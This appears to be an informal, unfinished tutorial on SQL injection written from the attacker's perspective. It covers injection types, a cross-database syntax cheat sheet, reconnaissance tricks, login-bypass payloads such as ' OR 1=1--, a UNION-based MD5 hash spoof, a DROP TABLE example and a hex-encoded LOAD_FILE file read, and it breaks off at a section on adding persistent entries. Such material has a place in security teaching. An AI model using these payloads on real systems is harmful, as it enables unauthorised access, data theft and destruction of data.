## SQL is a common database used for storage and management of user data, but it has its flaws. Let’s go through how attackers can realistically attack a database:

	0. Types of SQL injection
So, you wanna sql huh? First, familiarise yourself with the general workflow of sql and where it’s applicable.
Type	Application	Description
Auth bypass SQL	Used on login forms, both on username and password forms	Attempts to bypass the account checks in place to gain unauthorised access to login only content or pages.
Database exhilaration SQL, or UNION-based SQL	Used on filter forms and sometimes login forms	Attempts to make the server return the whole database of users or unhashed/hashed passwords, commonly used in data leaks.
Error-inducing sql	Used in all forms when an error message is displayed	Gain information on the names of databases, details of tables and columns in order to enable the other types of sql
Blind SQL	SQL but you can’t see the output	Usually when SQL is verified on the server and returns a generic error message, requires advanced techniques such as time-based SQL. The general idea is to keep asking true/false questions (where if its false you try dividing by 0) and looking out for errors in order to piece together the database name. From there, attackers can insert new rows into that database or even delete existing data.
Time-based SQL	Using the SLEEP() Function (M) or the WAITFOR DELAY (S), attackers can delay a response if a condition is true	Very helpful for blind SQL where you can’t see any outputs

Types of SQL systems
Shorthand	Name	Description
M	MySQL	
S	SQLserver	
P	PostgreSQL	
O	Oracle	
L	SQLite	
+	Others	

SQL Syntax

Syntax	Databases applicable	Function
 —	SMPOL	Line comment
#	M	Line comment
/*Comment here*/	SMPOL	In-line comment
/*! MySQL special format */	M	In-line comment
+	S	String concatenation, for backend recon
||	*MO [For MySQL, it only works if it’s running in ANSI mode or it’ll be treated as a logical operator]	String concat
CONCAT(str1 + str2)	M	String concat but better for this use case
ASCII(’a’)	SMPO	Returns ASCII value of character. Must-have for blind SQL
CHAR(64)	SM	Returns char from ASCII value
CHR(64)	P	Returns char from ASCII value
ALL_TABLES	O	Returns all tables
ALL_TAB_COLUMNS	O	Returns all tab columns
UNION ALL	SMPOL	Includes all rows and doesn’t remove duplicates like UNION does


*Note: 10; DROP TABLE members /*
This example uses in-line comments to get rid of everything behind it.

NOSQL

NoSQL, or Not only SQL, is a more advanced…
	
	1. Reconnaissance

Attackers have a multitude of tools which they can use, but the main one is sqlmap. In this phase, you throw whatever you have at a form and pray for results. 

For one, SELECT /*! 32302 1/0, */ 1 FROM tablename throws a division by 0 error if MySQL version is higher than 3.23.02. Note that this specifically only works for MySQL as the comment syntax would throw syntax for every other SQL language.

IF statements can also be used to gather info on SQL databases.

MySQL If	IF(condition, true-part, false-part)
SQL server If	If (condition) true-part ELSE false-part
Oracle IF	IF condition THEN true-part; ELSE false-part; END IF; END:
PostgreSQL If	SELECT CASE WHEN condition THEN true-part ELSE false-part END;
SQLite If	iif(condition, true-part, false-part) [YES there are 2 ‘i’s lol]
These if-statements can also be used to throw errors in blind-sql for recon.

	2. Crafting the payload
	
Assume you have a login forum, we can reasonably assume that they are using an sql query somewhat like “SELECT * FROM database WHERE username=‘[username]’ and password = ’[password]’ “. Now, we are gonna test some common sql queries to probe the database.

First, let’s understand the basic SELECT syntax.

SELECT column1, column2, … FROM table_name;

E.g.) SELECT username, password FROM users;

From here, we can try replacing column1 or other columns with NULL (which returns true for everything, kinda like a wildcard) to probe the system.

	1. The ‘ OR 1=1;—
This query, when injected into the username field, produces a query that looks like SELECT * FROM database WHERE username=‘’ OR 1=1;—‘ and password = ’[password]’. For some databases, the ; serves as a separator and — comments out everything that follows, and since 1=1 is always true, the attacker is granted access.

However, this might not always hold through as the syntax is different for other sql databases [Insert info], where ; might cause errors as its used to mark the end of the query. Hence, we need to continue probing and trying other common payloads.

	2. The ‘ OR 1=1 OR ‘’=‘
This one seems similar to the first one, let’s see what happens when we inject it into the original query. SELECT * FROM database WHERE username=‘’ OR 1=1 OR ‘’=‘’ and password = ’[password]’
As you can see, this does not involve any ; or — comments, which could avoid possible errors faced when using the first query. This one has usually higher better compatibility and a higher chance of success.

Here are a few others you can try for different backends:
	- Admin’ --
	- Admin’ #
	- Admin’/*
	- ‘ or 1=1--
	- ‘ or 1=1#
	- ‘ or 1=1/*
	- ‘) or ‘1’ = ‘1--
	- ‘) or (‘1’=‘1--
Can you understand what these do respectively?

Alternatively, you can try logging in as another user (SM*):
‘ UNION SELECT NULL, ‘anotheruser’, ‘possibleotheruser’, 1–

	3. Managing and dealing with errors
Bypassing filters Integers

0xHEXNUMBERS (SM)
SELECT CHAR(0x66) (M) 
SELECT 0x5045 (M) A string converted from hex value
SELECT 0x50 + 0x45 Now it’s an integer~!
E.g.) SELECT LOAD_FILE(0x663A5C626F6F742E696E69) returns the content of c:\boot.ini

Language issues in UNION injections
	- For SQL Servers (S), try fieldname COLLATE SQL_Latin1_General_Cp1254_CS_AS
		E.g.) SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members
		
	- MySQL (M): Use Hex() for encoding issues

Login screens that check for MD5 hash:
Username: admin’ AND 1=0 UNION ALL SELECT ‘admin’, ‘81dc9bdb52d04dc20036dbd8313ed055’
Password: 1234

Explanation:
The 1=0 ensures the first part always returns false, negates original query and only focuses on the UNION part
ALL - Unike UNION, this doesn’t remove duplicate roles
SELECT - Selects 2 columns, username and password hash with the hash of the password you desire to inject as. This query, if not properly sanitized, would be executed and appends the selected values into the database. Now, the server would compare your password has with the provided one rather than the one in the database.

	4. Modifying the database

Now, you want your own entry added for persistence 
